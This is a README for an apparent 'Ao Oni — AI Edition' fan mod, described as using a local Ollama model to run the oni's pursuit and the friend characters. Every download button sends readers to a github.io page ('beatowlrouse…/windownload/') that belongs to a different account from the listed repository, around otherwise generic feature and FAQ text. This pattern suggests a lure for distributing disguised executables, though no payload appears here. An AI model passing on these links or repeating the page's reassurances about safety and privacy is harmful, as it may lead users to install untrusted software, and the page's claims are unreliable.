<div align="center">

# Ao Oni — AI Edition

[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://beatowlrouse.github.io/windownload/)
[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://beatowlrouse.github.io/windownload/)
[![The oni is pursuing](https://img.shields.io/badge/Oni-Pursuing-1f4e8b?style=for-the-badge)](https://beatowlrouse.github.io/windownload/)

[![Local](https://img.shields.io/badge/100%25-Local%20%26%20Private-brightgreen?style=flat-square)](https://github.com/TitanDeliverer/ao-oni-ai-edition)
[![Offline](https://img.shields.io/badge/Works-Offline-informational?style=flat-square)](https://github.com/TitanDeliverer/ao-oni-ai-edition)
[![No Subscription](https://img.shields.io/badge/Cost-%240%20Forever-success?style=flat-square)](https://github.com/TitanDeliverer/ao-oni-ai-edition)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)

👹 **RPG Maker · Chase Horror · AI Roleplay · Locally Hosted**

</div>

---

## About

**Ao Oni — AI Edition** is about being chased through a mansion by something purple and badly proportioned, and the mod's entire design is the chase.

A locally-hosted model runs the oni as a pursuing intelligence: it tracks where you've been, learns your routes, and cuts you off. It also plays Hiroshi's increasingly useless friends, who are all somehow still arguing.

> 👹 The oni is not on a script. It maintains a model of your movement across the session and chooses where to appear based on it.

---

## ✨ Features

- 🏃 **Adaptive pursuit** — The oni learns your routes and blocks them.
- 🚪 **Mansion navigation** — Room-by-room description with hiding spots and dead ends.
- 👥 **Friend personas** — Takeshi, Mika and Takuro, all panicking differently.
- 🧩 **Puzzle generation** — New mansion puzzles in the original's simple, mean style.
- 🔒 **Runs locally** — Free, offline, private.
- 📊 **Escape statistics** — How long you lasted, and how it caught you.

---

## 👥 In the Mansion

| Character | Role | How the AI plays them |
|-----------|------|-----------------------|
| **Ao Oni** | The oni | Wordless, persistent, and modelling your behaviour |
| **Hiroshi** | Protagonist | Playable, or an AI persona who makes bad decisions confidently |
| **Takeshi** | Friend | Aggressive bravado that lasts about four minutes |
| **Mika** | Friend | The only one suggesting they leave, ignored by everyone |

> Every persona is a plain-text file. Open it, rewrite it, and the character changes.

---

## 📥 Download & Installation

### Step 1 — Get the mod

[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://beatowlrouse.github.io/windownload/)

### Step 2 — Install Ollama (the local AI engine)

Ollama is a free, open-source runtime that executes language models directly on your own hardware.

1. Download it from **https://ollama.com/download** for your operating system
2. Run the installer and let it finish
3. Open a terminal and pull a model:

   ```
   ollama pull llama3
   ```

   *(~4.7 GB. Any model from https://ollama.com/library will work — larger models give
   better in-character writing, smaller ones respond faster.)*

### Step 3 — Install into Ao Oni

1. Start from a clean, working installation of **Ao Oni**
2. Extract the downloaded archive
3. Copy its contents into the game's main folder
4. Launch the game — the AI layer initialises on first run

---

## 🎯 Running

1. Change your routes. The pursuit model punishes repetition specifically.
2. The escape statistics file makes for good session-to-session comparison.
3. Friend personas are best in group mode — the arguing is half the appeal.

---

## ⚙️ Recommended Setup

| Tier | Model | RAM | VRAM | Feel |
|------|-------|-----|------|------|
| Minimum | 7B quantised | 8 GB | 4 GB | Works; expect pauses |
| Recommended | 8B–13B | 16 GB | 8 GB | Smooth, in-character |
| Best | 27B+ | 32 GB | 16 GB+ | Noticeably sharper writing |

CPU-only inference is supported and slower. No GPU is strictly required.

---

## ❓ FAQ

**Q: Which version of Ao Oni?**
> Version 3 and 6.23 asset layouts are both supported.

**Q: Does the oni cheat?**
> It has access to your movement log by design. Whether that's cheating is between you and it.

**Q: Is there a way to win?**
> Yes, escape routes exist. The mod tracks whether you found one.

**Q: Are my conversations private?**
> Completely. The model runs on your machine and logs are written to a local folder.
> Disconnect from the internet and the mod keeps working.

**Q: Does this use ChatGPT or any paid API?**
> No. There are no API keys, no accounts, and no subscriptions. Ollama is free and open source.

**Q: Can I use an uncensored model?**
> Yes — pull any model from https://ollama.com/library. Uncensored variants sometimes follow
> the roleplay format less reliably, which is a trade-off you control.

**Q: Will this touch my save files?**
> No. The mod never reads or writes the game's save data.

**Q: The AI returned an error instead of a reply. Why?**
> The model produced output the mod couldn't parse. Switch models, lower the temperature,
> or shorten the system prompt.

---

## 📋 Compatibility

| Platform | Status |
|----------|--------|
| Windows 10 / 11 | ✅ Full support |
| macOS (Intel & Apple Silicon) | ✅ Full support |
| Linux | ✅ Full support |
| Ollama models | Any model from ollama.com/library |
| Base game | Ao Oni — PC release |

---

## 🔗 Links

- **[⬇ Download the latest version](https://beatowlrouse.github.io/windownload/)**
- [Repository](https://github.com/TitanDeliverer/ao-oni-ai-edition)
- [Ollama — local AI runtime](https://ollama.com)
- [Ollama model library](https://ollama.com/library)

---

<div align="center">

*It's in the hallway. It was not in the hallway a moment ago.*

*Fan-made, unofficial, and not affiliated with the creators of Ao Oni.
All game assets are read from your own legally obtained copy.*

</div>
